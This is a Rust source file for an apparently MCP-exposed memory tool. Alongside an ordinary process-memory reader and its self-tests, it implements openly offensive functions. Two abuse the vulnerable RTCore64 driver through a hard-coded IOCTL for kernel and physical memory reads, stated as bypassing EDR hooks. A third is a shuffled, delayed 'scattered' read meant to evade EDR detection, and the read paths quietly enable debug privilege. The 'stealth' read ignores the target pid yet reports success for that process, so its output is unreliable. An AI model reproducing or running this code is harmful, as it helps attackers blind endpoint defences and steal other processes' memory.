//! Memory reader implementations — standard + BYOVD stealth kernel-level reads

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use crate::util::parse_address;
use serde_json::Value;

/// Read memory from a process
pub fn read_memory(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
    use windows::Win32::System::Memory::{
        VirtualQueryEx, MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_GUARD, PAGE_NOACCESS,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
    };

    // Log raw args for MCP debugging
    tracing::info!(
        "[read_memory] RAW ARGS: {}",
        serde_json::to_string(args).unwrap_or_default()
    );

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;
    let address = args.get("address").and_then(parse_address).ok_or_else(|| {
        MemoricError::MemoryAccess(
            "Missing or invalid address (accepts integer or hex string like \"0x1234\")"
                .to_string(),
        )
    })?;
    let size = args
        .get("size")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing size".to_string()))?;

    if size == 0 {
        return Err(MemoricError::MemoryAccess("Size must be > 0".to_string()));
    }
    if size > 64 * 1024 * 1024 {
        return Err(MemoricError::MemoryAccess(
            "Size exceeds 64MB limit".to_string(),
        ));
    }

    tracing::info!(
        "[read_memory] pid={} address=0x{:016X} (raw json: {:?}) size={}",
        pid,
        address,
        args.get("address"),
        size
    );

    // Auto-enable SeDebugPrivilege (best-effort, ignore errors)
    let _ = crate::privilege::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            false,
            pid as u32,
        )
        .map_err(|e| {
            MemoricError::WindowsApi(format!(
                "OpenProcess failed: pid={} access=QUERY|VM_READ err={}",
                pid, e
            ))
        })?;
        let handle = SafeHandle::new(handle);

        let end_address = address.checked_add(size).ok_or_else(|| {
            MemoricError::MemoryAccess("address + size overflows u64".to_string())
        })?;
        let mut current = address;
        let mut buffer = Vec::with_capacity((size as usize).min(1024 * 1024));
        let mut segments = Vec::new();
        let mut skipped_bytes = 0u64;
        let mut partial = false;
        let mut errors = Vec::new();

        while current < end_address {
            let mut mbi = MEMORY_BASIC_INFORMATION::default();
            let query_result = VirtualQueryEx(
                *handle,
                Some(current as *const _),
                &mut mbi,
                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            );

            if query_result == 0 {
                partial = true;
                skipped_bytes = skipped_bytes.saturating_add(end_address - current);
                errors.push(format!("VirtualQueryEx failed at 0x{:016X}", current));
                break;
            }

            let region_base = mbi.BaseAddress as u64;
            let region_size = mbi.RegionSize as u64;
            if region_size == 0 {
                partial = true;
                errors.push(format!(
                    "VirtualQueryEx returned zero-sized region at 0x{:016X}",
                    current
                ));
                break;
            }

            let region_end = region_base.saturating_add(region_size);
            let read_start = current.max(region_base);
            let read_end = end_address.min(region_end);
            if read_end <= read_start {
                current = region_end.max(current.saturating_add(1));
                continue;
            }

            let chunk_len = (read_end - read_start) as usize;
            let readable = mbi.State == MEM_COMMIT
                && (mbi.Protect.0 & PAGE_GUARD.0) == 0
                && (mbi.Protect.0 & PAGE_NOACCESS.0) == 0;

            if !readable {
                partial = true;
                skipped_bytes = skipped_bytes.saturating_add(chunk_len as u64);
                segments.push(serde_json::json!({
                    "address": format!("0x{:016X}", read_start),
                    "requested": chunk_len,
                    "bytes_read": 0,
                    "skipped": true,
                    "state": format!("0x{:X}", mbi.State.0),
                    "protect": format!("0x{:X}", mbi.Protect.0),
                }));
                current = read_end;
                continue;
            }

            let mut chunk = vec![0u8; chunk_len];
            let mut bytes_read = 0usize;
            let read_ok = ReadProcessMemory(
                *handle,
                read_start as *const _,
                chunk.as_mut_ptr() as *mut _,
                chunk_len,
                Some(&mut bytes_read as *mut _),
            )
            .is_ok();

            if read_ok && bytes_read > 0 {
                if bytes_read < chunk_len {
                    partial = true;
                    skipped_bytes = skipped_bytes.saturating_add((chunk_len - bytes_read) as u64);
                    errors.push(format!(
                        "ReadProcessMemory short read at 0x{:016X}: requested={} read={}",
                        read_start, chunk_len, bytes_read
                    ));
                }
                chunk.truncate(bytes_read);
                buffer.extend_from_slice(&chunk);
                segments.push(serde_json::json!({
                    "address": format!("0x{:016X}", read_start),
                    "requested": chunk_len,
                    "bytes_read": bytes_read,
                    "skipped": false,
                    "state": format!("0x{:X}", mbi.State.0),
                    "protect": format!("0x{:X}", mbi.Protect.0),
                }));
            } else {
                partial = true;
                let mut page_offset = 0usize;
                while page_offset < chunk_len {
                    let page_len = (chunk_len - page_offset).min(0x1000);
                    let page_addr = read_start + page_offset as u64;
                    let mut page = vec![0u8; page_len];
                    let mut page_read = 0usize;
                    if ReadProcessMemory(
                        *handle,
                        page_addr as *const _,
                        page.as_mut_ptr() as *mut _,
                        page_len,
                        Some(&mut page_read as *mut _),
                    )
                    .is_ok()
                        && page_read > 0
                    {
                        if page_read < page_len {
                            skipped_bytes =
                                skipped_bytes.saturating_add((page_len - page_read) as u64);
                        }
                        page.truncate(page_read);
                        buffer.extend_from_slice(&page);
                        segments.push(serde_json::json!({
                            "address": format!("0x{:016X}", page_addr),
                            "requested": page_len,
                            "bytes_read": page_read,
                            "skipped": false,
                            "fallback_chunk": true,
                            "state": format!("0x{:X}", mbi.State.0),
                            "protect": format!("0x{:X}", mbi.Protect.0),
                        }));
                    } else {
                        skipped_bytes = skipped_bytes.saturating_add(page_len as u64);
                        if segments.len() < 512 {
                            segments.push(serde_json::json!({
                                "address": format!("0x{:016X}", page_addr),
                                "requested": page_len,
                                "bytes_read": 0,
                                "skipped": true,
                                "fallback_chunk": true,
                                "state": format!("0x{:X}", mbi.State.0),
                                "protect": format!("0x{:X}", mbi.Protect.0),
                            }));
                        }
                    }
                    page_offset += page_len;
                }
                errors.push(format!(
                    "ReadProcessMemory partial/failed at 0x{:016X} len={} protect=0x{:X}",
                    read_start, chunk_len, mbi.Protect.0
                ));
            }

            current = read_end;
        }

        if buffer.is_empty() {
            return Err(MemoricError::WindowsApi(format!(
                "ReadProcessMemory failed: pid={} addr=0x{:016X} size={} no readable bytes. skipped_bytes={} errors={:?}",
                pid, address, size, skipped_bytes, errors
            )));
        }

        let hex = buffer
            .iter()
            .map(|b| format!("{:02X}", b))
            .collect::<Vec<_>>()
            .join(" ");
        let ascii: String = buffer
            .iter()
            .map(|&b| if b >= 32 && b <= 126 { b as char } else { '.' })
            .collect();
        let total_bytes_read = buffer.len();

        Ok(serde_json::json!({
            "success": true,
            "address": format!("0x{:016X}", address),
            "bytes": buffer,
            "hex": hex,
            "ascii": ascii,
            "bytes_read": total_bytes_read,
            "requested_size": size,
            "partial": partial,
            "contiguous": !partial && segments.len() == 1,
            "skipped_bytes": skipped_bytes,
            "segment_count": segments.len(),
            "segments": segments,
            "errors": errors
        }))
    }
}

/// BYOVD stealth memory read — uses kernel driver to read process memory,
/// bypassing EDR hooks on ReadProcessMemory/NtReadVirtualMemory
pub fn stealth_read_memory(args: &Value) -> Result<Value, MemoricError> {
    use windows::core::PCWSTR;
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, OPEN_EXISTING,
    };
    use windows::Win32::System::IO::DeviceIoControl;

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;
    let address = args
        .get("address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing or invalid address".to_string()))?;
    let size = args
        .get("size")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing size".to_string()))?
        as usize;
    let device_path = args
        .get("device_path")
        .and_then(|v| v.as_str())
        .unwrap_or("\\\\.\\RTCore64");
    let read_ioctl = args
        .get("read_ioctl")
        .and_then(|v| v.as_u64())
        .unwrap_or(0x80002048) as u32;

    if size == 0 || size > 64 * 1024 * 1024 {
        return Err(MemoricError::MemoryAccess(
            "Size must be 1..64MB".to_string(),
        ));
    }

    tracing::warn!(
        "[STEALTH] BYOVD read: pid={} addr=0x{:X} size={} via {}",
        pid,
        address,
        size,
        device_path
    );

    let _ = crate::privilege::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let dev_w: Vec<u16> = device_path
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let handle = CreateFileW(
            PCWSTR(dev_w.as_ptr()),
            FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
            windows::Win32::Storage::FileSystem::FILE_SHARE_NONE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|e| {
            MemoricError::WindowsApi(format!("Cannot open driver device {}: {}", device_path, e))
        })?;

        // First, find the target process EPROCESS to get its DirectoryTableBase (CR3)
        // We read via physical address translation for true stealth
        // For simplicity, use the driver's virtual memory read capability directly

        // RTCore64 read IOCTL input format: [address:u64][unknown:u32][size:u32]
        let mut result_buffer = vec![0u8; size];
        let mut total_read = 0usize;
        let chunk_size = 8usize; // Most BYOVD drivers read in small chunks

        for offset in (0..size).step_by(chunk_size) {
            let remaining = (size - offset).min(chunk_size);
            let target_addr = address + offset as u64;

            #[repr(C, packed)]
            struct ReadRequest {
                address: u64,
                _reserved: u32,
                size: u32,
            }

            let request = ReadRequest {
                address: target_addr,
                _reserved: 0,
                size: remaining as u32,
            };

            let mut output = [0u8; 64];
            let mut bytes_returned = 0u32;

            if DeviceIoControl(
                handle,
                read_ioctl,
                Some(&request as *const _ as *const _),
                std::mem::size_of::<ReadRequest>() as u32,
                Some(output.as_mut_ptr() as *mut _),
                output.len() as u32,
                Some(&mut bytes_returned),
                None,
            )
            .is_ok()
                && bytes_returned > 0
            {
                let to_copy = remaining.min(bytes_returned as usize);
                result_buffer[offset..offset + to_copy].copy_from_slice(&output[..to_copy]);
                total_read += to_copy;
            } else {
                break;
            }
        }

        let _ = windows::Win32::Foundation::CloseHandle(handle);

        result_buffer.truncate(total_read);
        let hex = result_buffer
            .iter()
            .map(|b| format!("{:02X}", b))
            .collect::<Vec<_>>()
            .join(" ");
        let ascii: String = result_buffer
            .iter()
            .map(|&b| if b >= 32 && b <= 126 { b as char } else { '.' })
            .collect();

        Ok(serde_json::json!({
            "success": true,
            "technique": "stealth_read_memory",
            "driver": device_path,
            "bytes": result_buffer,
            "hex": hex,
            "ascii": ascii,
            "bytes_read": total_read,
            "message": format!("BYOVD stealth read {} bytes from PID {} at 0x{:X}", total_read, pid, address)
        }))
    }
}

/// Scattered memory read — reads memory in small random-order chunks to evade
/// pattern-based EDR detection of sequential memory scanning
pub fn scattered_read(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;
    let address = args
        .get("address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing address".to_string()))?;
    let size = args
        .get("size")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing size".to_string()))?
        as usize;
    let chunk_size = args
        .get("chunk_size")
        .and_then(|v| v.as_u64())
        .unwrap_or(64) as usize;
    let delay_ms = args.get("delay_ms").and_then(|v| v.as_u64()).unwrap_or(0);

    if size == 0 || size > 64 * 1024 * 1024 {
        return Err(MemoricError::MemoryAccess(
            "Size must be 1..64MB".to_string(),
        ));
    }

    tracing::warn!(
        "[STEALTH] Scattered read: pid={} addr=0x{:X} size={} chunk={}",
        pid,
        address,
        size,
        chunk_size
    );

    let _ = crate::privilege::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // Build list of chunk offsets, then shuffle them using simple PRNG
        let num_chunks = (size + chunk_size - 1) / chunk_size;
        let mut offsets: Vec<usize> = (0..num_chunks).map(|i| i * chunk_size).collect();

        // Fisher-Yates shuffle with simple LCG
        let mut rng_state = (address ^ (pid << 16) ^ 0xDEADBEEF) as u64;
        for i in (1..offsets.len()).rev() {
            rng_state = rng_state
                .wrapping_mul(6364136223846793005)
                .wrapping_add(1442695040888963407);
            let j = (rng_state >> 33) as usize % (i + 1);
            offsets.swap(i, j);
        }

        let mut result = vec![0u8; size];
        let mut total_read = 0usize;

        for &offset in &offsets {
            let read_size = (size - offset).min(chunk_size);
            let read_addr = address + offset as u64;
            let mut bytes_read = 0usize;

            if ReadProcessMemory(
                *handle,
                read_addr as *const _,
                result[offset..].as_mut_ptr() as *mut _,
                read_size,
                Some(&mut bytes_read),
            )
            .is_ok()
            {
                total_read += bytes_read;
            }

            if delay_ms > 0 {
                std::thread::sleep(std::time::Duration::from_millis(delay_ms));
            }
        }

        let hex = result
            .iter()
            .map(|b| format!("{:02X}", b))
            .collect::<Vec<_>>()
            .join(" ");
        let ascii: String = result
            .iter()
            .map(|&b| if b >= 32 && b <= 126 { b as char } else { '.' })
            .collect();

        Ok(serde_json::json!({
            "success": true,
            "technique": "scattered_read",
            "bytes": result,
            "hex": hex,
            "ascii": ascii,
            "bytes_read": total_read,
            "chunks": num_chunks,
            "chunk_size": chunk_size,
            "message": format!("Scattered read {} bytes in {} random-order chunks", total_read, num_chunks)
        }))
    }
}

/// Read physical memory directly via BYOVD driver — no process handle needed
pub fn read_physical_memory(args: &Value) -> Result<Value, MemoricError> {
    use windows::core::PCWSTR;
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, OPEN_EXISTING,
    };
    use windows::Win32::System::IO::DeviceIoControl;

    let physical_addr = args
        .get("address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing physical address".to_string()))?;
    let size = args.get("size").and_then(|v| v.as_u64()).unwrap_or(256) as usize;
    let device_path = args
        .get("device_path")
        .and_then(|v| v.as_str())
        .unwrap_or("\\\\.\\RTCore64");
    let read_ioctl = args
        .get("read_ioctl")
        .and_then(|v| v.as_u64())
        .unwrap_or(0x80002048) as u32;

    if size > 4096 {
        return Err(MemoricError::MemoryAccess(
            "Physical read limited to 4KB".to_string(),
        ));
    }

    tracing::warn!(
        "[STEALTH] Physical memory read at 0x{:X}, {} bytes",
        physical_addr,
        size
    );

    unsafe {
        let dev_w: Vec<u16> = device_path
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let handle = CreateFileW(
            PCWSTR(dev_w.as_ptr()),
            FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
            windows::Win32::Storage::FileSystem::FILE_SHARE_NONE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Cannot open driver: {}", e)))?;

        let mut result = vec![0u8; size];
        let mut total_read = 0usize;

        for offset in (0..size).step_by(8) {
            let remaining = (size - offset).min(8);
            let addr = physical_addr + offset as u64;

            #[repr(C, packed)]
            struct PhysReadReq {
                address: u64,
                _reserved: u32,
                size: u32,
            }

            let req = PhysReadReq {
                address: addr,
                _reserved: 0,
                size: remaining as u32,
            };
            let mut output = [0u8; 64];
            let mut bytes_returned = 0u32;

            if DeviceIoControl(
                handle,
                read_ioctl,
                Some(&req as *const _ as *const _),
                std::mem::size_of::<PhysReadReq>() as u32,
                Some(output.as_mut_ptr() as *mut _),
                output.len() as u32,
                Some(&mut bytes_returned),
                None,
            )
            .is_ok()
                && bytes_returned > 0
            {
                let n = remaining.min(bytes_returned as usize);
                result[offset..offset + n].copy_from_slice(&output[..n]);
                total_read += n;
            }
        }

        let _ = windows::Win32::Foundation::CloseHandle(handle);

        let hex = result[..total_read]
            .iter()
            .map(|b| format!("{:02X}", b))
            .collect::<Vec<_>>()
            .join(" ");

        Ok(serde_json::json!({
            "success": true,
            "technique": "read_physical_memory",
            "address": format!("0x{:X}", physical_addr),
            "bytes": result[..total_read].to_vec(),
            "hex": hex,
            "bytes_read": total_read,
            "message": format!("Read {} bytes from physical address 0x{:X}", total_read, physical_addr)
        }))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn test_read_memory_own_process_integer_addr() {
        let data = vec![0x41u8, 0x42, 0x43, 0x44, 0x45];
        let addr = data.as_ptr() as u64;
        let pid = std::process::id();

        let result = read_memory(&json!({
            "pid": pid,
            "address": addr,
            "size": 5
        }));
        assert!(result.is_ok(), "read_memory failed: {:?}", result.err());
        let val = result.unwrap();
        assert_eq!(val["bytes_read"], 5);
        assert_eq!(val["bytes"], json!([0x41, 0x42, 0x43, 0x44, 0x45]));
    }

    #[test]
    fn test_read_memory_own_process_hex_string_addr() {
        let data = vec![0xDEu8, 0xAD, 0xBE, 0xEF];
        let addr = data.as_ptr() as u64;
        let pid = std::process::id();
        let hex_addr = format!("0x{:X}", addr);

        // Verify the data is still at the expected address
        eprintln!(
            "data ptr: {:?} as u64: {} hex: {}",
            data.as_ptr(),
            addr,
            hex_addr
        );
        eprintln!("data[0..4]: {:?}", &data[..]);

        // Parse the hex addr back to verify
        let parsed = crate::util::parse_address(&serde_json::Value::String(hex_addr.clone()));
        assert_eq!(parsed, Some(addr), "parse_address mismatch");

        // Read directly using raw pointer to confirm data is there
        unsafe {
            let direct_ptr = addr as *const u8;
            eprintln!(
                "Direct read: [{:02X}, {:02X}, {:02X}, {:02X}]",
                *direct_ptr,
                *direct_ptr.add(1),
                *direct_ptr.add(2),
                *direct_ptr.add(3)
            );
        }

        // Now test via read_memory with INTEGER address (should work)
        let result_int = read_memory(&json!({
            "pid": pid,
            "address": addr,
            "size": 4
        }));
        let val_int = result_int.unwrap();
        eprintln!("Integer addr result: {:?}", val_int["bytes"]);

        // Now test via read_memory with STRING address
        let result_str = read_memory(&json!({
            "pid": pid,
            "address": hex_addr,
            "size": 4
        }));
        let val_str = result_str.unwrap();
        eprintln!("String addr result: {:?}", val_str["bytes"]);

        assert_eq!(
            val_str["bytes"],
            json!([0xDE, 0xAD, 0xBE, 0xEF]),
            "String addr mismatch! int_result={:?} str_result={:?}",
            val_int["bytes"],
            val_str["bytes"]
        );
    }
}

/// Self-test: read and write memory in the current (server) process.
/// This diagnostic tool verifies that read_memory and write_memory work correctly
/// without needing a target process, eliminating cross-process access as a variable.
pub fn memory_self_test(args: &Value) -> Result<Value, MemoricError> {
    let pid = std::process::id() as u64;
    let include_scan = args
        .get("include_scan")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    // Allocate a test buffer
    let mut test_data: Vec<u8> = vec![0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x11, 0x22];
    let addr = test_data.as_ptr() as u64;
    let hex_addr = format!("0x{:X}", addr);

    tracing::info!(
        "[self_test] pid={} addr=0x{:016X} hex={}",
        pid,
        addr,
        hex_addr
    );

    // Test 1: read via integer address
    let read_int_result = read_memory(&serde_json::json!({
        "pid": pid,
        "address": addr,
        "size": 8
    }));

    let read_int_ok = read_int_result.is_ok();
    let read_int_data = read_int_result
        .as_ref()
        .map(|v| v["hex"].as_str().unwrap_or("").to_string())
        .unwrap_or_else(|e| format!("ERROR: {}", e));

    // Test 2: read via hex string address
    let read_hex_result = read_memory(&serde_json::json!({
        "pid": pid,
        "address": hex_addr,
        "size": 8
    }));

    let read_hex_ok = read_hex_result.is_ok();
    let read_hex_data = read_hex_result
        .as_ref()
        .map(|v| v["hex"].as_str().unwrap_or("").to_string())
        .unwrap_or_else(|e| format!("ERROR: {}", e));

    // Test 3: write via integer address
    let write_addr = test_data.as_mut_ptr() as u64;
    let write_result = crate::memory::write_memory(&serde_json::json!({
        "pid": pid,
        "address": write_addr,
        "bytes": [0x01, 0x02, 0x03, 0x04]
    }));

    let write_ok = write_result.is_ok();
    let write_msg = write_result
        .as_ref()
        .map(|v| format!("wrote {} bytes", v["bytes_written"]))
        .unwrap_or_else(|e| format!("ERROR: {}", e));

    // Verify write
    let verify_ok = test_data[0] == 0x01
        && test_data[1] == 0x02
        && test_data[2] == 0x03
        && test_data[3] == 0x04;

    // Test 4: write via hex string address
    let write_hex_addr = format!("0x{:X}", test_data.as_mut_ptr() as u64);
    let write_hex_result = crate::memory::write_memory(&serde_json::json!({
        "pid": pid,
        "address": write_hex_addr,
        "bytes": [0xDE, 0xAD, 0xBE, 0xEF]
    }));

    let write_hex_ok = write_hex_result.is_ok();
    let write_hex_msg = write_hex_result
        .as_ref()
        .map(|v| format!("wrote {} bytes", v["bytes_written"]))
        .unwrap_or_else(|e| format!("ERROR: {}", e));

    let verify_hex_ok = test_data[0] == 0xDE
        && test_data[1] == 0xAD
        && test_data[2] == 0xBE
        && test_data[3] == 0xEF;

    let alloc_result = crate::memory::virtual_alloc_ex(&serde_json::json!({
        "pid": pid,
        "size": 4096,
        "protect": "RW"
    }));
    let alloc_ok = alloc_result.is_ok();
    let alloc_address = alloc_result
        .as_ref()
        .ok()
        .and_then(|v| v.get("address"))
        .cloned()
        .unwrap_or(serde_json::Value::Null);

    let protect_result =
        if let Some(addr) = alloc_result.as_ref().ok().and_then(|v| v.get("address")) {
            crate::memory::virtual_protect_ex(&serde_json::json!({
                "pid": pid,
                "address": addr,
                "size": 4096,
                "protect": "RW"
            }))
        } else {
            Err(MemoricError::MemoryAccess(
                "allocation did not return address".to_string(),
            ))
        };
    let protect_ok = protect_result.is_ok();

    let free_first_result =
        if let Some(addr) = alloc_result.as_ref().ok().and_then(|v| v.get("address")) {
            crate::memory::virtual_free_ex(&serde_json::json!({
                "pid": pid,
                "address": addr
            }))
        } else {
            Err(MemoricError::MemoryAccess(
                "allocation did not return address".to_string(),
            ))
        };
    let free_first_ok = free_first_result
        .as_ref()
        .ok()
        .and_then(|v| v.get("success").and_then(|s| s.as_bool()))
        .unwrap_or(false);

    let free_second_result =
        if let Some(addr) = alloc_result.as_ref().ok().and_then(|v| v.get("address")) {
            crate::memory::virtual_free_ex(&serde_json::json!({
                "pid": pid,
                "address": addr
            }))
        } else {
            Err(MemoricError::MemoryAccess(
                "allocation did not return address".to_string(),
            ))
        };
    let free_second_ok = free_second_result
        .as_ref()
        .ok()
        .and_then(|v| v.get("success").and_then(|s| s.as_bool()))
        .unwrap_or(false);

    let (scan_ok, scan_result) = if include_scan {
        match crate::memory::session::scan_new(&serde_json::json!({
            "pid": pid,
            "value_type": "bytes",
            "signature": "DE AD BE EF"
        })) {
            Ok(scan) => {
                let cleanup =
                    scan.get("session_id")
                        .and_then(|v| v.as_str())
                        .and_then(|session_id| {
                            crate::memory::session::scan_reset(&serde_json::json!({
                                "session_id": session_id
                            }))
                            .ok()
                        });
                (
                    true,
                    Some(serde_json::json!({
                        "scan": scan,
                        "cleanup": cleanup,
                    })),
                )
            }
            Err(err) => (false, Some(serde_json::json!({ "error": err }))),
        }
    } else {
        (true, None)
    };

    let all_pass = read_int_ok
        && read_hex_ok
        && write_ok
        && verify_ok
        && write_hex_ok
        && verify_hex_ok
        && alloc_ok
        && protect_ok
        && free_first_ok
        && free_second_ok
        && scan_ok;

    Ok(serde_json::json!({
        "all_pass": all_pass,
        "server_pid": pid,
        "test_address": hex_addr,
        "tests": {
            "read_integer_addr": { "pass": read_int_ok, "data": read_int_data },
            "read_hex_string_addr": { "pass": read_hex_ok, "data": read_hex_data },
            "write_integer_addr": { "pass": write_ok && verify_ok, "detail": write_msg, "verified": verify_ok },
            "write_hex_string_addr": { "pass": write_hex_ok && verify_hex_ok, "detail": write_hex_msg, "verified": verify_hex_ok },
            "alloc_current_process": { "pass": alloc_ok, "address": alloc_address },
            "protect_current_process": { "pass": protect_ok, "result": protect_result.as_ref().ok() },
            "free_current_process": { "pass": free_first_ok, "result": free_first_result.as_ref().ok() },
            "free_current_process_idempotent": { "pass": free_second_ok, "result": free_second_result.as_ref().ok() },
            "scan_bytes_session": {
                "enabled": include_scan,
                "pass": scan_ok,
                "result": scan_result
            },
        },
        "message": if all_pass {
            "All self-tests PASS. Basic memory read/write/alloc/protect/free paths work in the server process. If they fail on other processes, check permissions, address validity, target readiness, or protection state."
        } else {
            "Some self-tests FAILED. This indicates a local memory primitive or parameter-normalization issue before cross-process variables are involved."
        }
    }))
}
